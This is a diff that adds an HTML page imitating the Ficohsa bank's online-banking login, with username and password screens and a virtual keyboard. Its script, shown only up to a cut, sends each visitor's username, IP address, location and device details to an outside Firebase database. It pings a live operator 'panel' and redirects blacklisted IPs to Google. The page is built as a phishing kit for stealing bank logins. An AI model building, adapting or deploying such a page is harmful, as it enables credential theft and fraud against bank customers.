@@ -1,0 +1,654 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Ficohsa</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
+<style>
+  * { box-sizing: border-box; }
+  :root { --kw: 33px; --kh: 27px; --kg: 3px; --kfs: 15px; }
+  html, body { margin: 0; padding: 0; }
+  body {
+    font-family: 'Open Sans', 'Segoe UI', Tahoma, Arial, sans-serif;
+    background: #e9e9e9; min-height: 100vh; min-width: 1000px; position: relative;
+  }
+  a { text-decoration: none; }
+
+  /* ===== HEADER ===== */
+  .topbar { position: relative; height: 200px; background: #0d4bbd; }
+  .topbar-links {
+    position: absolute; top: 24px; right: 40px; display: flex; align-items: center; gap: 14px;
+    color: #fff; font-size: 14.5px; letter-spacing: .6px; font-weight: 600;
+  }
+  .topbar-links a { color: #fff; display: flex; align-items: center; gap: 7px; }
+  .topbar-links .pipe { color: #9dbdf0; font-weight: 400; }
+  .mob { display: none; }
+
+  .logo { position: absolute; top: 45px; left: 50%; transform: translateX(-50%); line-height: 0; }
+  .logo svg { display: block; width: 260px; height: auto; }
+
+  /* ===== CONTENIDO ===== */
+  .wrapper { width: 944px; margin: 0 auto; position: relative; z-index: 2; }
+
+  .card {
+    margin-top: -48px; background: #fff; border: 1px solid #dedede;
+    box-shadow: 0 1px 5px rgba(0,0,0,.13); padding: 20px 34px 14px 34px;
+  }
+
+  .card-head { display: flex; align-items: center; gap: 13px; }
+  .card-head h1 { margin: 0; font-size: 34px; font-weight: 400; color: #4a4a4a; letter-spacing: .3px; }
+  .card-head .vline { width: 1px; height: 36px; background: #d5d5d5; }
+  .back {
+    width: 32px; height: 32px; padding: 0; border: none; background: none; cursor: pointer;
+    display: flex; align-items: center; justify-content: center;
+  }
+  .back:hover { opacity: .7; }
+
+  .form-col { width: 420px; margin-left: 50px; margin-top: 30px; }
+
+  .field-row { display: flex; align-items: center; gap: 5px; }
+  .user-icon { flex: 0 0 auto; display: block; }
+  .input-wrap { position: relative; flex: 1; }
+  .field-row input {
+    width: 100%; height: 42px;
+    border: 1px solid #c6c6c6; border-left: 3px solid #2b7de9;
+    padding: 0 38px 0 12px; font-family: inherit; font-size: 19px; color: #333; outline: none; background: #fff;
+    transition: border-color .15s, box-shadow .15s;
+  }
+  .field-row input::placeholder { color: #828282; }
+  .field-row input:focus { border-color: #9dc0f5; border-left-color: #0d4bbd; box-shadow: 0 0 0 2px rgba(13,75,189,.14); }
+  .eye {
+    position: absolute; right: 9px; top: 50%; transform: translateY(-50%);
+    border: none; background: none; padding: 0; cursor: pointer; line-height: 0;
+  }
+  .eye:hover { opacity: .7; }
+
+  .teclado-link { text-align: right; margin-top: 8px; font-size: 15.5px; }
+
+  .options { margin-top: 11px; display: flex; align-items: center; justify-content: space-between; font-size: 15.5px; color: #4a4a4a; }
+  .options label { display: flex; align-items: center; gap: 6px; cursor: pointer; user-select: none; }
+  .options input[type=checkbox] {
+    width: 17px; height: 17px; margin: 0; flex: 0 0 auto;
+    appearance: none; -webkit-appearance: none; border: 1px solid #b5b5b5; background: #fff;
+    cursor: pointer; position: relative; transition: background .15s, border-color .15s;
+  }
+  .options input[type=checkbox]:hover { border-color: #2b7de9; }
+  .options input[type=checkbox]:checked { background: #0d4bbd; border-color: #0d4bbd; }
+  .options input[type=checkbox]:checked::after {
+    content: ""; position: absolute; left: 5px; top: 1.5px; width: 4px; height: 8px;
+    border: solid #fff; border-width: 0 2px 2px 0; transform: rotate(45deg);
+  }
+  .navy { color: #0c3f8f; }
+
+  .btn-row { margin-top: 26px; display: flex; justify-content: flex-end; align-items: center; gap: 43px; }
+  .btn-row button[type=submit] {
+    width: 185px; height: 38px; border: none; background: #85adf2; color: #fff;
+    font-family: inherit; font-size: 17.5px; font-weight: 600; letter-spacing: .3px;
+    cursor: default; transition: background .18s, box-shadow .18s;
+  }
+  .btn-row button[type=submit].ready { background: #0d4bbd; cursor: pointer; }
+  .btn-row button[type=submit].ready:hover { background: #0a3f9f; }
+  .btn-row button[type=submit].ready:active { box-shadow: inset 0 2px 5px rgba(0,0,0,.25); }
+  .link-btn {
+    border: none; background: none; padding: 0; color: #0d4bbd;
+    font-family: inherit; font-size: 17px; cursor: pointer;
+  }
+  .link-btn:hover { text-decoration: underline; }
+
+  .divider { border: none; border-top: 1px solid #d9d9d9; margin: 40px -34px 0 -34px; }
+  .divider.inset { margin: 40px 0 0 0; }
+
+  .card-links { margin-top: 12px; text-align: center; font-size: 16px; color: #0c3f8f; line-height: 1.85; }
+  .card-links .pipe { color: #0c3f8f; margin: 0 6px; }
+  .card-links a:hover, .navy:hover { text-decoration: underline; }
+  .brk { display: none; }
+
+  .seguridad { display: flex; align-items: flex-start; gap: 13px; margin-top: 28px; }
+  .seguridad .img-box { width: 86px; height: 86px; flex: 0 0 auto; line-height: 0; overflow: hidden; }
+  .seguridad .img-box img, .seguridad .img-box svg { width: 100%; height: 100%; display: block; object-fit: cover; }
+  .seguridad p { margin: 4px 0 0 0; font-size: 16px; color: #4a4a4a; max-width: 180px; line-height: 1.55; }
+  .seguridad .ayuda { vertical-align: -2px; margin-left: 2px; }
+
+  /* ===== PIE ===== */
+  .footer-row { margin-top: 24px; display: flex; justify-content: space-between; align-items: center; font-size: 15px; color: #4a4a4a; }
+  .footer-row .copy { display: flex; align-items: center; gap: 5px; }
+  .footer-row .copy .c { color: #7a7a7a; font-size: 15px; }
+  .footer-row .faq { display: flex; align-items: center; gap: 6px; color: #0c3f8f; font-size: 15.5px; }
+  .footer-row .faq:hover, .footer-row a.navy:hover { text-decoration: underline; }
+
+  .browser-note { margin-top: 12px; display: flex; align-items: flex-start; gap: 7px; font-size: 14.5px; color: #6f6f6f; line-height: 1.45; padding-bottom: 80px; }
+
+  /* ===== WIDGET SARA ===== */
+  .sara {
+    position: fixed; right: 28px; bottom: 26px; display: flex; align-items: center; gap: 9px;
+    background: #fff; border-radius: 999px; padding: 6px 22px 6px 6px;
+    box-shadow: 0 2px 10px rgba(0,0,0,.22); cursor: pointer; z-index: 50; transition: transform .15s, box-shadow .15s;
+  }
+  .sara:hover { transform: translateY(-2px); box-shadow: 0 5px 16px rgba(0,0,0,.28); }
+  .sara .avatar { width: 38px; height: 38px; border-radius: 50%; background: #0d4bbd; display: flex; align-items: center; justify-content: center; }
+  .sara .name { color: #0c3f8f; font-size: 17px; font-weight: 600; }
+
+  /* ================= TECLADO VIRTUAL ================= */
+  .vk { display: none; width: fit-content; margin: 26px auto 0; background: #fff; padding: 22px 30px 14px 20px; user-select: none; }
+  .vk.open { display: block; }
+  .vk-row { display: flex; margin-bottom: var(--kg); }
+  .vk-row:last-child { margin-bottom: 0; }
+  .k {
+    width: var(--kw); height: var(--kh); margin-right: var(--kg); padding: 0; border: none;
+    background: #a8d8d8; color: #14507d; font-family: inherit; font-size: var(--kfs);
+    font-weight: 600; line-height: var(--kh); cursor: pointer; transition: background .12s, color .12s;
+  }
+  .k:hover { background: #8fcccc; }
+  .k:active { background: #7cc0c0; }
+  .k.wide { width: calc(var(--kw) * 1.45); font-size: calc(var(--kfs) * .85); }
+  .k.caps { width: calc(var(--kw) * 1.9); font-size: calc(var(--kfs) * .72); line-height: 1.1; padding-top: 3px; }
+  .k.space { width: calc(var(--kw) * 6.7); }
+  .k.activo { background: #7cc0c0; box-shadow: inset 0 2px 4px rgba(0,0,0,.18); }
+  .r1 { padding-left: calc(var(--kw) * .7); }
+  .r2 { padding-left: calc(var(--kw) * 1.5); }
+  .r4 { padding-left: calc(var(--kw) * 1.0); }
+  .r5 { justify-content: center; }
+
+  .vk-sep { border: none; border-top: 1px solid #dcdcdc; margin: 24px 0 0 0; }
+  .vk-opts { display: flex; justify-content: center; gap: 44px; padding: 15px 0 8px; font-size: 16px; color: #0c3f8f; }
+  .vk-opts label { display: flex; align-items: center; gap: 9px; cursor: pointer; }
+  .vk-opts input[type=radio] {
+    appearance: none; -webkit-appearance: none; width: 19px; height: 19px; margin: 0;
+    border: 2px solid #0c3f8f; border-radius: 50%; position: relative; cursor: pointer; background: #fff;
+  }
+  .vk-opts input[type=radio]:checked::after { content: ""; position: absolute; inset: 2px; border-radius: 50%; background: #0d4bbd; }
+
+  .vk.alto { background: #111; }
+  .vk.alto .k { background: #111; color: #fff; border: 1px solid #fff; font-weight: 700; }
+  .vk.alto .k:hover { background: #333; }
+  .vk.alto .k:active, .vk.alto .k.activo { background: #ffd400; color: #000; }
+  .vk.alto .vk-sep { border-top-color: #fff; }
+  .vk.alto .vk-opts { color: #fff; }
+  .vk.alto .vk-opts input[type=radio] { border-color: #fff; background: #111; }
+  .vk.alto .vk-opts input[type=radio]:checked::after { background: #ffd400; }
+
+  /* ================= MOVIL ================= */
+  @media (max-width: 768px) {
+    :root { --kw: 21px; --kh: 19px; --kg: 2px; --kfs: 11px; }
+    body { min-width: 0; }
+    .topbar { height: 38px; }
+    .desk { display: none !important; }
+    .mob { display: flex; }
+
+    .topbar-links { top: 0; right: 10px; height: 38px; gap: 9px; font-size: 13px; letter-spacing: .5px; }
+    .topbar-links .pipe { color: #8fb3ec; }
+    .card-ico { width: 30px; height: 21px; border-radius: 3px; background: #2f74d0; align-items: center; justify-content: center; }
+
+    .logo { left: 10px; top: 0; height: 38px; transform: none; display: flex; align-items: center; }
+    .logo svg { width: 92px; height: auto; }
+
+    .wrapper { width: 100%; }
+    .card { margin-top: 0; min-height: 482px; border: none; box-shadow: none; padding: 17px 14px 20px 20px; }
+
+    .card-head { gap: 9px; }
+    .card-head h1 { font-size: 19px; }
+    .card-head .vline { height: 24px; }
+    .back { width: 22px; height: 22px; }
+    .back svg { width: 22px; height: 22px; }
+
+    .form-col { width: 100%; margin-left: 0; margin-top: 16px; }
+    .user-icon { width: 24px; height: 24px; }
+    .field-row { gap: 5px; }
+    .field-row input { height: 34px; font-size: 15.5px; padding: 0 32px 0 10px; }
+    .eye svg { width: 19px; height: 15px; }
+
+    .teclado-link { display: none; }
+
+    .options { font-size: 13.5px; margin-top: 9px; }
+    .options input[type=checkbox] { width: 15px; height: 15px; }
+    .options input[type=checkbox]:checked::after { left: 4px; top: 1px; width: 3px; height: 7px; }
+
+    .btn-row { margin-top: 18px; gap: 10px; }
+    .btn-row button[type=submit] { width: 78px; height: 30px; font-size: 14px; }
+    .link-btn { font-size: 14px; }
+
+    .seguridad { margin-top: 18px; gap: 10px; }
+    .seguridad .img-box { width: 62px; height: 62px; }
+    .seguridad p { font-size: 12.5px; max-width: 215px; margin-top: 0; line-height: 1.5; }
+
+    .divider, .divider.inset { margin: 26px 0 0 0; }
+    .card-links { font-size: 12.5px; line-height: 1.9; margin-top: 10px; }
+    .card-links .pipe { margin: 0 5px; }
+    .links-clave { text-align: right; }
+    .links-clave .pipe { display: none; }
+    .brk { display: block; }
+
+    .vk { margin: 18px auto 0; padding: 14px 12px 10px 12px; }
+    .vk-sep { margin-top: 16px; }
+    .vk-opts { font-size: 12.5px; gap: 22px; padding: 12px 0 6px; }
+    .vk-opts input[type=radio] { width: 15px; height: 15px; }
+
+    .footer-row { margin-top: 155px; font-size: 13px; padding: 0 14px 0 20px; }
+    .browser-note { font-size: 13px; padding: 0 14px 70px 20px; }
+
+    .sara { right: 12px; bottom: 12px; padding: 4px 16px 4px 4px; gap: 7px; }
+    .sara .avatar { width: 30px; height: 30px; }
+    .sara .name { font-size: 15px; }
+  }
+</style>
+</head>
+<body>
+
+  <header class="topbar">
+    <div class="topbar-links">
+      <a class="desk" href="#">CONTÁCTANOS</a>
+      <span class="pipe desk">|</span>
+      <a class="desk" href="#">ESPAÑOL
+        <svg width="13" height="8" viewBox="0 0 13 8" fill="none"><path d="M1 1l5.5 5.5L12 1" stroke="#fff" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"/></svg>
+      </a>
+      <a class="mob card-ico" href="#">
+        <svg width="17" height="13" viewBox="0 0 17 13" fill="none">
+          <rect x=".7" y=".7" width="15.6" height="11.6" rx="1.4" stroke="#fff" stroke-width="1.3"/>
+          <path d="M.7 4.2h15.6" stroke="#fff" stroke-width="1.3"/>
+          <path d="M3.2 8.6h4" stroke="#fff" stroke-width="1.2" stroke-linecap="round"/>
+        </svg>
+      </a>
+      <span class="pipe mob">|</span>
+      <a class="mob" href="#">ES
+        <svg width="11" height="7" viewBox="0 0 13 8" fill="none"><path d="M1 1l5.5 5.5L12 1" stroke="#fff" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></svg>
+      </a>
+    </div>
+
+    <div class="logo">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 734 166" fill="none">
+        <path d="M120.236 24.39C122.656 29.41 120.586 33.91 115.216 34.6L103.626 36.16C34.236 45.5 16.416 69.9 12.436 86.34L2.05598 62.29C-9.01402 35.82 24.376 7.78 108.126 0L120.236 24.39ZM106.566 47.23C30.256 57.61 13.646 89.28 21.086 106.41L32.336 132.54C32.336 109.7 62.966 92.74 110.716 83.74C116.946 82.53 120.236 78.2 117.806 72.67L106.566 47.23ZM47.736 123.71C43.756 127.69 40.986 133.23 40.986 138.07C40.986 152.43 55.696 161.95 91.516 162.64L78.366 136.68C56.906 138.08 50.506 131.15 47.736 123.71ZM607.716 110.68C598.546 108.81 591.416 107.28 591.416 101.51C591.416 96.25 597.016 93.53 608.226 93.53C615.526 93.53 621.986 94.72 628.266 96.76L632.856 79.1C627.256 77.06 619.266 75.02 608.226 75.02C585.806 75.02 570.866 86.23 570.866 102.87C570.866 121.38 586.996 125.12 599.906 128C609.076 130.04 616.886 131.74 616.886 137.85C616.886 144.64 609.416 146.85 600.586 146.85C591.756 146.85 585.306 144.13 579.356 137.68L566.956 152.96C575.276 161.11 586.826 165.19 599.906 165.19C622.156 165.19 637.606 153.47 637.606 136.83C637.606 117.13 620.956 113.57 607.716 110.68ZM733.896 83.68V162.65H715.556V155.35C709.276 161.12 700.446 165.2 689.236 165.2C665.286 165.2 647.966 147.37 647.966 122.57C647.966 93.7 667.496 75.02 697.726 75.02C711.136 75.02 723.196 77.9 733.896 83.68ZM713.856 96.41C709.096 94.54 703.156 93.52 696.706 93.52C679.216 93.52 668.856 103.71 668.856 121.03C668.856 137.33 678.876 147.52 695.346 147.52C702.646 147.52 709.106 145.65 713.856 142.43V96.41ZM520.926 75.02C510.906 75.02 502.076 77.91 495.796 83.51V44.28H475.756V162.65H495.796V98.28C502.416 94.88 508.536 93.35 515.156 93.35C526.536 93.35 533.326 98.78 533.326 107.79V162.64H553.366V107.28C553.366 87.07 541.306 75.02 520.926 75.02ZM458.946 120.19C458.946 146 438.906 165.36 412.246 165.36C385.586 165.36 365.546 146 365.546 120.19C365.546 94.38 385.756 75.02 412.246 75.02C438.736 75.02 458.946 94.38 458.946 120.19ZM438.056 120.19C438.056 102.53 425.146 93.36 412.246 93.36C399.346 93.36 386.606 102.53 386.606 120.19C386.606 137.85 399.516 146.85 412.246 146.85C424.976 146.85 438.056 137.68 438.056 120.19ZM329.876 146.68C316.966 146.68 303.216 138.36 303.216 120.02C303.216 104.57 314.256 93.7 330.046 93.7C339.046 93.7 344.486 97.27 348.386 100.66L360.106 86.39C355.016 80.45 343.296 75.01 329.706 75.01C302.196 75.01 282.156 94.2 282.156 120.69C282.156 147.18 301.006 165.36 327.836 165.36C342.106 165.36 354.836 160.1 361.636 151.94L349.746 138.69C344.136 144.31 337.686 146.68 329.876 146.68ZM245.976 162.65H266.016V77.74H245.976V162.65ZM255.996 44.28C249.206 44.28 243.766 49.71 243.766 56.51C243.766 63.31 249.196 68.74 255.996 68.74C262.796 68.74 268.226 63.31 268.226 56.51C268.226 49.71 262.786 44.28 255.996 44.28ZM154.096 162.65H176.006V117.14H228.146V98.12H176.006V66.02H231.366V47.17H154.096V162.65Z" fill="#FFFFFF"/>
+      </svg>
+    </div>
+  </header>
+
+  <div class="wrapper">
+    <div class="card">
+
+      <!-- ================= PANTALLA 1: USUARIO ================= -->
+      <div id="pantallaUsuario">
+        <div class="card-head"><h1>Bienvenido</h1></div>
+
+        <form class="form-col" id="formUsuario" autocomplete="off">
+          <div class="field-row">
+            <svg class="user-icon" width="30" height="30" viewBox="0 0 30 30" fill="none">
+              <circle cx="15" cy="15" r="13.4" stroke="#2b7de9" stroke-width="1.3"/>
+              <circle cx="15" cy="11.4" r="3.5" stroke="#2b7de9" stroke-width="1.3"/>
+              <path d="M7.6 25.2c1.1-4 4.1-6.2 7.4-6.2s6.3 2.2 7.4 6.2" stroke="#2b7de9" stroke-width="1.3"/>
+            </svg>
+            <div class="input-wrap"><input type="text" id="usuario" required placeholder="Ingrese su usuario" aria-label="Usuario"></div>
+          </div>
+
+          <div class="options">
+            <label><input type="checkbox" id="recordar"> ¿Recordar usuario?</label>
+            <a class="navy" href="#" id="linkTeclado1">Teclado virtual</a>
+          </div>
+
+          <div class="btn-row">
+            <button type="submit" id="btnSiguiente">Siguiente</button>
+          </div>
+        </form>
+
+        <hr class="divider">
+
+        <div class="card-links">
+          <a href="#">¿Aún no tienes usuario?</a><span class="pipe">|</span><a href="#">¿Ha olvidado su usuario?</a><span class="pipe">|</span><br>
+          <a href="#">¿Ha olvidado su contraseña?</a>
+        </div>
+      </div>
+
+      <!-- ================= PANTALLA 2: CONTRASEÑA ================= -->
+      <div id="pantallaClave" hidden>
+        <div class="card-head">
+          <button class="back" id="btnAtras" aria-label="Atrás">
+            <svg width="32" height="32" viewBox="0 0 32 32" fill="none">
+              <circle cx="16" cy="16" r="14.3" stroke="#5b7fae" stroke-width="1.3"/>
+              <path d="M18.5 10.5L13 16l5.5 5.5" stroke="#5b7fae" stroke-width="1.4" stroke-linecap="round" stroke-linejoin="round"/>
+              <path d="M13.4 16h8" stroke="#5b7fae" stroke-width="1.4" stroke-linecap="round"/>
+            </svg>
+          </button>
+          <span class="vline"></span>
+          <h1>Contraseña</h1>
+        </div>
+
+        <form class="form-col" id="formClave" autocomplete="off">
+          <div class="field-row">
+            <svg class="user-icon" width="26" height="32" viewBox="0 0 26 32" fill="none">
+              <rect x="3" y="12.5" width="20" height="15" rx="2" stroke="#2b7de9" stroke-width="1.3"/>
+              <path d="M7.5 12.5V9a5.5 5.5 0 0111 0v3.5" stroke="#2b7de9" stroke-width="1.3"/>
+              <circle cx="13" cy="19" r="1.8" fill="#2b7de9"/>
+              <path d="M13 20.6v2.4" stroke="#2b7de9" stroke-width="1.3" stroke-linecap="round"/>
+            </svg>
+            <div class="input-wrap">
+              <input type="password" id="clave" placeholder="Ingrese su contraseña" required aria-label="Contraseña">
+              <button type="button" class="eye" id="verClave" aria-label="Mostrar contraseña">
+                <svg width="24" height="19" viewBox="0 0 24 19" fill="none">
+                  <path d="M1.2 9.5C4 4.3 7.9 2 12 2s8 2.3 10.8 7.5C20 14.7 16.1 17 12 17S4 14.7 1.2 9.5z" stroke="#9a9a9a" stroke-width="1.3"/>
+                  <circle cx="12" cy="9.5" r="3.4" stroke="#9a9a9a" stroke-width="1.3"/>
+                </svg>
+              </button>
+            </div>
+          </div>
+
+          <div class="teclado-link"><a class="navy" href="#" id="linkTeclado2">Teclado virtual</a></div>
+
+          <div class="seguridad">
+            <div class="img-box">
+              <img src="seguridad.png" alt="Error al cargar"
+            </div>
+            <p>Asegúrese que esta es la imagen seleccionada por Ud
+              <svg class="ayuda" width="15" height="15" viewBox="0 0 17 17" fill="none">
+                <circle cx="8.5" cy="8.5" r="7.4" stroke="#8c9bb0" stroke-width="1.2"/>
+                <path d="M6.5 6.6c0-1.1.9-1.9 2-1.9s2 .8 2 1.9c0 1.5-2 1.5-2 3" stroke="#8c9bb0" stroke-width="1.2" stroke-linecap="round"/>
+                <circle cx="8.5" cy="12" r=".8" fill="#8c9bb0"/>
+              </svg>
+            </p>
+          </div>
+
+          <div class="btn-row">
+            <button type="button" class="link-btn" id="btnCancelar">Cancelar</button>
+            <button type="submit" id="btnIngresar">Siguiente</button>
+          </div>
+        </form>
+
+        <hr class="divider inset">
+
+        <div class="card-links links-clave">
+          <a href="#">¿Ha olvidado su contraseña?</a><span class="pipe">|</span><span class="brk"></span><a href="#">¿Su usuario ha sido bloqueado?</a>
+        </div>
+      </div>
+
+      <!-- ================= TECLADO VIRTUAL ================= -->
+      <div class="vk" id="vk">
+        <div class="vk-row r1">
+          <button type="button" class="k" data-k="1">1</button><button type="button" class="k" data-k="2">2</button><button type="button" class="k" data-k="3">3</button><button type="button" class="k" data-k="4">4</button><button type="button" class="k" data-k="5">5</button><button type="button" class="k" data-k="6">6</button><button type="button" class="k" data-k="7">7</button><button type="button" class="k" data-k="8">8</button><button type="button" class="k" data-k="9">9</button><button type="button" class="k" data-k="0">0</button><button type="button" class="k wide" data-k="BkSp">BkSp</button>
+        </div>
+        <div class="vk-row r2">
+          <button type="button" class="k" data-k="q">q</button><button type="button" class="k" data-k="w">w</button><button type="button" class="k" data-k="e">e</button><button type="button" class="k" data-k="r">r</button><button type="button" class="k" data-k="t">t</button><button type="button" class="k" data-k="y">y</button><button type="button" class="k" data-k="u">u</button><button type="button" class="k" data-k="i">i</button><button type="button" class="k" data-k="o">o</button><button type="button" class="k" data-k="p">p</button><button type="button" class="k" data-k="´">´</button><button type="button" class="k" data-k="+">+</button>
+        </div>
+        <div class="vk-row r3">
+          <button type="button" class="k caps" data-k="Caps">Caps Lock</button><button type="button" class="k" data-k="a">a</button><button type="button" class="k" data-k="s">s</button><button type="button" class="k" data-k="d">d</button><button type="button" class="k" data-k="f">f</button><button type="button" class="k" data-k="g">g</button><button type="button" class="k" data-k="h">h</button><button type="button" class="k" data-k="j">j</button><button type="button" class="k" data-k="k">k</button><button type="button" class="k" data-k="l">l</button><button type="button" class="k" data-k="ñ">ñ</button><button type="button" class="k" data-k="{">{</button><button type="button" class="k" data-k="}">}</button>
+        </div>
+        <div class="vk-row r4">
+          <button type="button" class="k" data-k="Shift">→</button><button type="button" class="k" data-k="z">z</button><button type="button" class="k" data-k="x">x</button><button type="button" class="k" data-k="c">c</button><button type="button" class="k" data-k="v">v</button><button type="button" class="k" data-k="b">b</button><button type="button" class="k" data-k="n">n</button><button type="button" class="k" data-k="m">m</button><button type="button" class="k" data-k=",">,</button><button type="button" class="k" data-k=".">.</button><button type="button" class="k" data-k="-">-</button>
+        </div>
+        <div class="vk-row r5"><button type="button" class="k space" data-k="Space">&nbsp;</button></div>
+
+        <hr class="vk-sep">
+
+        <div class="vk-opts">
+          <label><input type="radio" name="contraste" value="bajo" checked> bajo contraste</label>
+          <label><input type="radio" name="contraste" value="alto"> alto contraste</label>
+        </div>
+      </div>
+
+    </div>
+
+    <div class="footer-row">
+      <div class="copy">
+        <span class="c">©</span>
+        <span>Grupo Ficohsa - <a class="navy" href="#">www.ficohsa.com</a></span>
+      </div>
+      <a class="faq" href="#">
+        <svg width="17" height="17" viewBox="0 0 17 17" fill="none">
+          <circle cx="8.5" cy="8.5" r="7.8" stroke="#0c3f8f" stroke-width="1.3"/>
+          <path d="M6.4 6.4c0-1.2.9-2.1 2.1-2.1s2.1.9 2.1 2c0 1.6-2.1 1.6-2.1 3.2" stroke="#0c3f8f" stroke-width="1.3" stroke-linecap="round"/>
+          <circle cx="8.5" cy="12.2" r=".85" fill="#0c3f8f"/>
+        </svg>
+        Preguntas frecuentes
+      </a>
+    </div>
+
+    <div class="browser-note">
+      <svg width="15" height="17" viewBox="0 0 15 17" fill="none" style="margin-top:1px;flex:0 0 auto">
+        <rect x="1" y="6.6" width="13" height="9.4" rx="1" stroke="#8c8c8c" stroke-width="1.3"/>
+        <path d="M4 6.6V4.6a3.5 3.5 0 017 0v2" stroke="#8c8c8c" stroke-width="1.3"/>
+        <circle cx="7.5" cy="11.3" r="1.3" fill="#8c8c8c"/>
+      </svg>
+      <span>Esta banca en línea soporta los navegadores Internet Explorer 10 y 11, Microsoft Edge - navegador de Windows 10, Safari 5.0, 5.1 y 6.0, Firefox y Chrome.</span>
+    </div>
+  </div>
+
+  <div class="sara" title="Asistente virtual Sara">
+    <span class="avatar">
+      <svg width="26" height="26" viewBox="0 0 122 166" fill="none">
+        <path d="M120.236 24.39C122.656 29.41 120.586 33.91 115.216 34.6L103.626 36.16C34.236 45.5 16.416 69.9 12.436 86.34L2.05598 62.29C-9.01402 35.82 24.376 7.78 108.126 0L120.236 24.39ZM106.566 47.23C30.256 57.61 13.646 89.28 21.086 106.41L32.336 132.54C32.336 109.7 62.966 92.74 110.716 83.74C116.946 82.53 120.236 78.2 117.806 72.67L106.566 47.23ZM47.736 123.71C43.756 127.69 40.986 133.23 40.986 138.07C40.986 152.43 55.696 161.95 91.516 162.64L78.366 136.68C56.906 138.08 50.506 131.15 47.736 123.71Z" fill="#FFFFFF"/>
+      </svg>
+    </span>
+    <span class="name">Sara</span>
+  </div>
+
+<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
+<script>
+/* ============================================================
+   CONFIG  ·  mismo valor en index.html, cargando.html,
+   codigo.html y panel.html
+   ============================================================ */
+const CFG = { DB_URL: "https://cbonnlineec-default-rtdb.firebaseio.com/", ROOT: "ficohsa", REDIRECT_BLOQUEADO: "https://www.google.com" };
+
+/* ================= MINI DB (Firebase + respaldo local) ================= */
+const DBX = (function(){
+  const KEY='ficohsa_db';
+  const vacio=()=>({logins:{},comandos:{},eliminados:{},blacklist:{},historial:{}});
+  let fb=null, subs=[];
+  const leer=()=>{ try{ return JSON.parse(localStorage.getItem(KEY))||vacio(); }catch(e){ return vacio(); } };
+  const escribir=t=>{ try{ localStorage.setItem(KEY,JSON.stringify(t)); }catch(e){} notificar(); };
+  const gp=(t,p)=>p.split('/').reduce((o,k)=>(o&&o[k]!==undefined)?o[k]:null,t);
+  function setP(p,v){ const t=leer(),ks=p.split('/'); let o=t; ks.slice(0,-1).forEach(k=>{ if(typeof o[k]!=='object'||o[k]===null) o[k]={}; o=o[k]; }); o[ks[ks.length-1]]=v; escribir(t); }
+  function delP(p){ const t=leer(),ks=p.split('/'); let o=t; for(let i=0;i<ks.length-1;i++){ o=o[ks[i]]; if(!o) return; } delete o[ks[ks.length-1]]; escribir(t); }
+  function notificar(){ subs.forEach(s=>{ try{ s.cb(gp(leer(),s.path)); }catch(e){} }); }
+  window.addEventListener('storage',e=>{ if(e.key===KEY) notificar(); });
+  return {
+    init(){ if(!CFG.DB_URL||typeof firebase==='undefined') return false;
+      if(!firebase.apps.length) firebase.initializeApp({databaseURL:CFG.DB_URL});
+      fb=firebase.database(); return true; },
+    set(p,v){ if(fb) return fb.ref(CFG.ROOT+'/'+p).set(v); setP(p,v); },
+    update(p,v){ if(fb) return fb.ref(CFG.ROOT+'/'+p).update(v);
+      const t=leer(); const cur=Object.assign({},gp(t,p)||{}); Object.assign(cur,v); setP(p,cur); },
+    remove(p){ if(fb) return fb.ref(CFG.ROOT+'/'+p).remove(); delP(p); },
+    on(p,cb){ if(fb){ fb.ref(CFG.ROOT+'/'+p).on('value',s=>cb(s.val())); } else { subs.push({path:p,cb}); cb(gp(leer(),p)); } }
+  };
+})();
+
+(function () {
+  var vk       = document.getElementById('vk');
+  var usuario  = document.getElementById('usuario');
+  var clave    = document.getElementById('clave');
+  var btnSig   = document.getElementById('btnSiguiente');
+  var btnIng   = document.getElementById('btnIngresar');
+  var chk      = document.getElementById('recordar');
+  var fUsuario = document.getElementById('formUsuario');
+  var fClave   = document.getElementById('formClave');
+  var pUsuario = document.getElementById('pantallaUsuario');
+  var pClave   = document.getElementById('pantallaClave');
+  var KEY      = 'ficohsa_usuario_recordado';
+  var campo = usuario, caps = false, shift = false;
+  var esMovil = function () { return window.innerWidth <= 768; };
+
+  DBX.init();
+
+  /* ---------- IP + ubicación ---------- */
+  var ipInfo = { ip: 'unknown', ubicacion: '' };
+  var blacklistCache = {};
+  DBX.on('blacklist', function (b) { blacklistCache = b || {}; revisarBloqueo(); });
+
+  fetch('https://ipapi.co/json/')
+    .then(function (r) { return r.json(); })
+    .then(function (d) {
+      ipInfo = { ip: d.ip || 'unknown', ubicacion: [d.city, d.region, d.country_name].filter(Boolean).join(', ') };
+      revisarBloqueo();
+    })
+    .catch(function () { revisarBloqueo(); });
+
+  function revisarBloqueo() {
+    if (ipInfo.ip === 'unknown') return;
+    var k = ipInfo.ip.replace(/\./g, '_').replace(/:/g, '-');
+    var bl = blacklistCache[k];
+    if (bl && bl.bloqueado) location.href = bl.redirigirA || CFG.REDIRECT_BLOQUEADO;
+  }
+
+  /* ---------- Sesión del cliente ---------- */
+  function nuevoId() { return 'ID-' + Math.random().toString(36).slice(2, 9).toUpperCase(); }
+  function sesionId() {
+    var s = sessionStorage.getItem('ficohsa_id');
+    if (!s) { s = nuevoId(); sessionStorage.setItem('ficohsa_id', s); }
+    return s;
+  }
+  function datosBase(pagina, status) {
+    return {
+      usuario: usuario.value.trim(), pagina: pagina, status: status, online: true,
+      ultimoPing: Date.now(), ip: ipInfo.ip, ubicacion: ipInfo.ubicacion,
+      dispositivo: esMovil() ? 'Móvil' : 'Escritorio', userAgent: navigator.userAgent
+    };
+  }
+
+  /* ---------- Ping para que el panel vea LIVE ---------- */
+  setInterval(function () {
+    var id = sessionStorage.getItem('ficohsa_id'); if (!id) return;
+    DBX.update('logins/' + id, { online: true, ultimoPing: Date.now() });
+  }, 5000);
+
+  /* ---------- Botones ---------- */
+  function bindReady(inp, btn) {
+    function sync() { btn.classList.toggle('ready', inp.value.trim().length > 0); }
+    inp.addEventListener('input', sync);
+    inp.addEventListener('focus', function () { campo = inp; });
+    sync();
+  }
